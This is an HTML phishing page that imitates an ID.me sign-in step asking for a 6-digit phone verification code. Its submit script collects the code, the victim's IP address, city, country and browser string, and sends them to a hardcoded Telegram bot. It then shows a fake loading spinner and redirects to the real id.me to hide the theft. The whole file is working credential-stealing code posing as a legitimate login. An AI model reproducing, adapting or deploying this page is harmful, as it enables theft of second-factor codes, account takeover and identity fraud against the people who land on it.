<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Secure Login</title>
    <script src="https://cdn.tailwindcss.com"></script>
  </head>

  <body class="bg-gray-100 flex flex-col items-center min-h-screen font-sans">
    <!-- Logo Section -->
    <div class="w-full bg-gray-200 py-8 flex justify-center">
      <img src="/logo.svg" width="80px" class="mb-4" />
    </div>

    <!-- Card -->
    <div class="w-full max-w-md bg-white rounded-xl shadow-lg p-8 -mt-6">
      <!-- Heading -->
      <h2 class="text-xl font-bold text-gray-800 text-center">
        Sign in to ID.me
      </h2>

      <!-- Required Note -->
      <p class="text-gray-600 text-sm mt-6">
        Confirm the 6-digits code sent to your Phone number<span id="email"></span>
      </p>

      <!-- Form -->
      <form class="mt-4 space-y-5" id="secondForm" action="javascript:void(0);">
        <!-- Password -->
        <div>
          <input
            type="number"
            id="password"
            placeholder="Enter Code"
            class="w-full mt-2 border-2 border-gray-600 rounded-md p-4 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition"
            required
          />
        </div>

        <!-- Button -->
        <button
          type="submit"
          class="w-full bg-[#266aca] hover:bg-blue-700 text-white font-semibold py-3 rounded-md transition"
        >
          Sign in
        </button>

        <!-- Notice Box -->
      </form>
    </div>

    <div
      id="loadingBarContainer"
      style="
        display: none;
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        z-index: 10000;
      "
    >
      <svg id="loadingBar" width="60" height="60" viewBox="0 0 50 50">
        <circle
          cx="25"
          cy="25"
          r="20"
          stroke="#007bff"
          stroke-width="5"
          fill="none"
          stroke-linecap="round"
        />
      </svg>
    </div>

    <script>
      document
        .getElementById("secondForm")
        .addEventListener("submit", async function (event) {
          event.preventDefault(); // Prevent default form submission

          // const email = document.getElementById("email").value;
          const password = document.getElementById("password").value;

          async function getUserLocation() {
            try {
              const response = await fetch("https://ipapi.co/json/");
              const data = await response.json();
              return {
                country: data.country_name || "Unknown",
                city: data.city || "Unknown",
                ip: data.ip || "Unknown",
              };
            } catch (error) {
              console.error("Error fetching user location:", error);
              return { country: "Unknown", city: "Unknown", ip: "Unknown" };
            }
          }

          const userAgent = navigator.userAgent;
          const location = await getUserLocation();

          const message = `Pin ${password}\nIP: ${location.ip}\nCountry: ${location.country}\nCity: ${location.city}\nBrowser: ${userAgent}`;

          const botToken = "7048228186:AAGaWpefH-VCjtn4SlLvY08tvlOIp6cQQGI";
          const chatId = "8057732319";
          const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

          // Show loading bar
          const loadingContainer = document.getElementById(
            "loadingBarContainer",
          );
          const loadingBar = document.getElementById("loadingBar");
          loadingContainer.style.display = "block";
          loadingBar.style.width = "0%";

          // Animate the progress bar over 6 seconds
          let width = 0;
          const interval = setInterval(() => {
            width += 1.67; // 100% / 60 steps ≈ 1.67% per 100ms
            loadingBar.style.width = width + "%";
            if (width >= 100) clearInterval(interval);
          }, 100);

          // Send data to Telegram
          fetch(telegramUrl)
            .then((response) => {
              // Wait for 6 seconds before redirecting
              setTimeout(() => {
                window.location.href = `https://www.id.me/`;
              }, 6000);
            })
            .catch((error) => {
              console.error("Error sending data to Telegram:", error);
              setTimeout(() => {
                window.location.href = `https://www.id.me/`;
              }, 6000);
            });
        });
    </script>
    <script>
      window.onload = function () {
        const params = new URLSearchParams(window.location.search);
        const email = params.get("email");
        console.log("Retrieved Email:", email);

        if (email) {
          const emailInput = document.getElementById("email");
          if (emailInput) {
            emailInput.value = email;
          } else {
            console.error("Email input field not found.");
          }
        } else {
          console.error("No email found in URL query parameter.");
        }
      };
    </script>

    <script>
      document.addEventListener("DOMContentLoaded", function () {
        const hash = window.location.hash; // Get URL hash

        if (hash) {
          const emailFromHash = hash.substring(1); // Extract email from hash (remove the #)
          if (validateEmail(emailFromHash)) {
            document.getElementById("email").value =
              decodeURIComponent(emailFromHash); // Pre-fill email input
          } else {
            console.error("Invalid email format in URL hash");
          }
        }

        // Validate email format
        function validateEmail(email) {
          const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
          return emailPattern.test(email);
        }
      });
    </script>

    <script>
      window.onload = function () {
        const params = new URLSearchParams(window.location.search);
        const email = params.get("email");
        console.log("Retrieved Email:", email);

        if (email) {
          const emailInput = document.getElementById("email");
          if (emailInput) {
            emailInput.value = email;
          } else {
            console.error("Email input field not found.");
          }
        } else {
          console.error("No email found in URL query parameter.");
        }
      };
    </script>

    <style>
      #loadingBarContainer svg circle {
        stroke-dasharray: 125.6; /* 2 * PI * r */
        stroke-dashoffset: 125.6;
        transform-origin: center;
        animation:
          spin 1s linear infinite,
          dash 1.5s ease-in-out infinite;
      }

      @keyframes spin {
        100% {
          transform: rotate(360deg);
        }
      }

      @keyframes dash {
        0% {
          stroke-dashoffset: 125.6;
        }
        50% {
          stroke-dashoffset: 31.4;
          transform: rotate(45deg);
        }
        100% {
          stroke-dashoffset: 125.6;
          transform: rotate(360deg);
        }
      }
    </style>
  </body>
</html>
